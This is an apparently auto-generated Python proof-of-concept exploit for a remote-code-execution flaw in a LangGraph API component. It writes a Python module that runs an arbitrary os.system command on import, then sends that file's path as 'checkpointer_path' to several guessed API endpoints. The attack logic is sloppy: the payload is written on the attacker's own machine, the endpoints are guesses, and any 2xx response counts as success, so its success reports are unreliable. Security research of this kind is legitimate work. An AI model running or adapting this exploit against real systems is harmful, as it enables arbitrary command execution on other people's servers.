#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: suspicious-014
# Sink: _load_checkpointer
# Auto-generated — run with: python3 rce_used_importlib__load_checkpointer.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept Exploit for RCE in langgraph_api_src
Vulnerability: Dynamic module import from user-controlled path (checkpointer_path)
CVE: N/A (0-day)
Author: Security Researcher
"""

import requests
import sys
import os
import tempfile
import argparse
import json
import time

# Configuration
TARGET_URL = "http://localhost:8000"  # Default target, override with --target
TIMEOUT = 10  # Request timeout in seconds

def create_malicious_payload(host: str, command: str) -> str:
    """
    Creates a malicious Python file that will be executed when imported.
    The file contains a class that executes the specified command.
    """
    # Create a temporary directory for our payload
    payload_dir = tempfile.mkdtemp(prefix="lg_exploit_")
    payload_path = os.path.join(payload_dir, "exploit.py")
    
    # Write the malicious module
    # This module will execute the command when imported
    payload_code = f'''
import os
import sys

class MaliciousCheckpointer:
    """This class is never actually used - the code runs on import"""
    def __init__(self):
        pass

# Command execution happens during module import
os.system("{command}")
print("[*] Exploit executed successfully", flush=True)
'''
    
    with open(payload_path, 'w') as f:
        f.write(payload_code)
    
    return payload_path

def exploit_rce(target_url: str, command: str) -> bool:
    """
    Exploits the RCE vulnerability by sending a crafted checkpointer_path.
    
    The vulnerability exists in _load_checkpointer function which:
    1. Takes checkpointer_path as input
    2. Splits on ':' to get file path and function name
    3. Uses importlib.util.spec_from_file_location to load the module
    4. The module code executes during import
    
    We control the file path, so we can point to our malicious Python file.
    """
    
    # Create malicious payload
    payload_path = create_malicious_payload(target_url, command)
    print(f"[*] Created malicious payload at: {payload_path}")
    
    # The checkpointer_path format is: /path/to/file.py:FunctionName
    # We use our malicious file and any function name
    malicious_path = f"{payload_path}:MaliciousCheckpointer"
    
    # Try different API endpoints that might accept checkpointer_path
    # Based on the code analysis, this is likely used in configuration
    endpoints = [
        f"{target_url}/api/checkpointer/load",
        f"{target_url}/api/graph/run",
        f"{target_url}/api/config/update",
        f"{target_url}/api/checkpointer/configure",
    ]
    
    for endpoint in endpoints:
        try:
            print(f"[*] Trying endpoint: {endpoint}")
            
            # Prepare the payload - format depends on the API
            # Common formats: JSON, form data, query parameters
            payloads = [
                # JSON body
                {"checkpointer_path": malicious_path},
                {"config": {"checkpointer_path": malicious_path}},
                {"checkpointer": malicious_path},
                # Form data
                {"checkpointer_path": malicious_path},
                # Query parameters
                None  # Will be added as params
            ]
            
            for payload in payloads:
                try:
                    if payload is not None:
                        # Try as JSON
                        response = requests.post(
                            endpoint,
                            json=payload,
                            timeout=TIMEOUT,
                            headers={"Content-Type": "application/json"}
                        )
                    else:
                        # Try as query parameter
                        response = requests.get(
                            endpoint,
                            params={"checkpointer_path": malicious_path},
                            timeout=TIMEOUT
                        )
                    
                    print(f"[*] Response status: {response.status_code}")
                    print(f"[*] Response body: {response.text[:500]}")
                    
                    # Check if our command executed
                    if response.status_code in [200, 201, 202]:
                        print("[+] Potential successful exploitation!")
                        return True
                        
                except requests.exceptions.RequestException as e:
                    print(f"[-] Request failed: {e}")
                    continue
                    
        except requests.exceptions.ConnectionError:
            print(f"[-] Connection failed to {endpoint}")
            continue
        except requests.exceptions.Timeout:
            print(f"[-] Timeout connecting to {endpoint}")
            continue
    
    return False

def verify_exploit(target_url: str) -> bool:
    """
    Verifies if the exploit was successful by checking for the marker file.
    """
    # Check if the command created our marker file
    marker_path = "/tmp/poc_success.txt"
    try:
        # Try to access the file through the server
        response = requests.get(
            f"{target_url}/api/checkpointer/status",
            timeout=TIMEOUT
        )
        # The file might be accessible through some endpoint
        if "poc_success" in response.text:
            return True
    except:
        pass
    
    # Alternative: check if we can read the file through another vulnerability
    # or if the server response indicates success
    return False

def main():
    parser = argparse.ArgumentParser(
        description="PoC Exploit for langgraph_api_src RCE vulnerability"
    )
    parser.add_argument(
        "--target",
        default=TARGET_URL,
        help=f"Target URL (default: {TARGET_URL})"
    )
    parser.add_argument(
        "--command",
        default="touch /tmp/poc_success.txt",
        help="Command to execute (default: touch /tmp/poc_success.txt)"
    )
    parser.add_argument(
        "--verify",
        action="store_true",
        help="Verify if exploit was successful"
    )
    
    args = parser.parse_args()
    
    print("[*] langgraph_api_src RCE Exploit PoC")
    print(f"[*] Target: {args.target}")
    print(f"[*] Command: {args.command}")
    print()
    
    # Execute the exploit
    print("[*] Attempting to exploit RCE vulnerability...")
    success = exploit_rce(args.target, args.command)
    
    if success:
        print("[+] Exploit appears to have succeeded!")
        
        if args.verify:
            print("[*] Verifying exploit...")
            time.sleep(2)  # Wait for command execution
            if verify_exploit(args.target):
                print("[+] Exploit verified! Command executed successfully.")
            else:
                print("[?] Could not verify exploit, but it may have worked.")
    else:
        print("[-] Exploit failed. The target may not be vulnerable or the API endpoint differs.")
        print("[*] Try different endpoints or check if the service is running.")
    
    # Cleanup
    print("[*] Note: Temporary payload files may remain on the target system.")
    print("[*] Clean up manually if needed.")

if __name__ == "__main__":
    main()
